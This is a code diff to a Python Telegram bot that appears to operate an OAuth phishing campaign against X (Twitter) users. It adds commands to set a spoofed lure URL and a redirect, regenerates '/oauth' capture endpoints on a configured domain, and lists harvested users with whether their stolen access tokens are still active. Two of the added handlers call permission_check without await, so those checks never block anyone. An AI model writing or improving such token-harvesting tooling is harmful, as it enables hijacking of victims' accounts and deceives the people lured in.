@@ -13,6 +13,8 @@ parse_mode = "MarkdownV2"
 db = get_db()
 groups = db["groups"]
 
+DOMAIN = config["DOMAIN"]
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
 
@@ -40,7 +42,7 @@ async def help(update, context) -> None:
 async def setup(update, context):
     chat_id = update.effective_chat.id
 
-    if await permission_check(update): return
+    if not await permission_check(update): return
 
     group = groups.find_one({"group.id": chat_id})
     if group:
@@ -83,7 +85,7 @@ async def setup(update, context):
 async def display_endpoint(update, context) -> None:
     chat_id = update.effective_chat.id
     
-    if await permission_check(update, groups): return
+    if not await permission_check(update, groups): return
 
     user_id = update.effective_user.id
 
@@ -94,12 +96,112 @@ async def display_endpoint(update, context) -> None:
     client_secret = group["client"]["secret"]
 
     if not client_id or not client_secret:
-        text = f"Client {'ID' if not client_id else 'secret'} hasn't been set yet\\.\n\n💬 _To set the client {'ID' if not client_id else 'secret'}, use the */set_client_{'id' if not client_id else 'secret'}* command followed by the OAuth app client {'ID' if not client_id else 'secret'}\\."
+        text = f"⚠️ *Client {'ID' if not client_id else 'secret'} hasn't been set yet\\.*\n\n💬 _To set the client {'ID' if not client_id else 'secret'}, use the */set_client_{'id' if not client_id else 'secret'}* command followed by the OAuth app client {'ID' if not client_id else 'secret'}\\."
     else:
         identifier = matched["identifier"]
-        endpoint = parse(config["DOMAIN"] + f"/oauth?i={identifier}")
+        endpoint = parse(DOMAIN + f"/oauth?i={identifier}")
 
         reply_markup = keyboards.refresh()
         text = f"🔗 *Your endpoint*: {endpoint}"
 
     await context.bot.send_message(chat_id, text, parse_mode)
+
+async def set_redirect(update: Update, context: CallbackContext) -> None:
+    chat_id = update.effective_chat.id
+    
+    if not await permission_check(update, groups, admin_command=True): return
+    
+    args = context.args
+    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_redirect <url>')
+
+    url = args[0]
+    if validators.url(url):
+        groups.update_one(
+            {"group.id": chat_id},
+            {"$set": {"redirect": url}}
+        )
+
+        text = f"✅ *Redirect URL successfully set to {parse(url)}\\.*"
+    else:
+        text = "⚠️ *The URL provided is invalid \\(format: https://calendly\\.com/\\)\\.*"
+        
+    await context.bot.send_message(chat_id, text, parse_mode)
+        
+async def set_spoof(update: Update, context: CallbackContext) -> None:
+    chat_id = get_chat_id(update)
+    
+    if not permission_check(update, groups, admin_command=True): return
+    
+    args = context.args
+    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_spoof <url>')
+
+    url = args[0]
+    if validators.url(url):
+        group = groups.find_one({"group.id": chat_id}, {"identifiers": 1})
+        identifiers = []
+
+        for item in group["identifiers"]:
+            item["identifier"] = f"{DOMAIN}/oauth?i={uuid.uuid4()}"
+            identifiers.append(item["identifier"])
+
+        groups.update_one(
+            {"group.id": chat_id},
+            {"$set": {"spoof": url, "identifiers": group["identifiers"]}}
+        )
+
+        text = f"✅ *Spoofed URL successfully set to {parse(url)}\\. All endpoints have been refresh\\.*"
+    else:
+        text = "⚠️ *The URL provided is invalid \\(format: https://calendly\\.com/\\)\\.*"
+           
+    await context.bot.send_message(chat_id, text, parse_mode)
+
+async def display_users(update, context, page=1, message_id=None) -> None:
+    chat_id = update.effective_chat.id
+    
+    if not permission_check(update, groups): return
+        
+    group = groups.find_one({"group.id": chat_id})
+    users = group['users']
+    online_users = [u for u in users if u.get("access_token")]
+    if users:
+        user_count = len(users)
+        sorted_users = sorted(users, key=lambda u: (bool(u.get('access_token')), -u['timestamp'].timestamp()))
+
+        users_per_page = 10
+        total_pages = max(1, -(-user_count // users_per_page))
+        
+        page = max(1, min(page, total_pages))
+        
+        start_idx = (page - 1) * users_per_page
+        end_idx = start_idx + users_per_page
+        paginated_users = sorted_users[start_idx:end_idx]
+
+        user_texts = []
+        for user in paginated_users:
+            authorized_at = parse(user['timestamp'].strftime('%m-%d-%Y'))
+            username = user['username']
+            access_token = user.get('access_token')
+
+            user_text = (
+                f"> {'🟢' if access_token else '🔴'} *[{parse(username)}](https://x\\.com/{username})* \\| _{authorized_at}_\n"
+            )
+            user_texts.append(user_text)
+            
+        reply_markup = keyboards.users_pagination(paginated_users, page, total_pages, users_per_page)
+        text = f"*👤 Authenticated Users* \\({len(online_users)}/{len(users)}\\)\n\n" + "\n\n".join(user_texts)
+
+        if message_id:
+            await context.bot.edit_message_text(
+                chat_id=chat_id, 
+                message_id=message_id, 
+                text=text, 
+                parse_mode=parse_mode, 
+                reply_markup=reply_markup, 
+                disable_web_page_preview=True
+            )        
+        else:
+            message = await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup, disable_web_page_preview=True)
+            context.user_data["message_id"] = message.message_id
+    else:
+        text = "*👤 Authenticated Users*\n\n> Nothing to see here 👀"
+        await context.bot.send_message(chat_id, text, parse_mode, disable_web_page_preview=True)
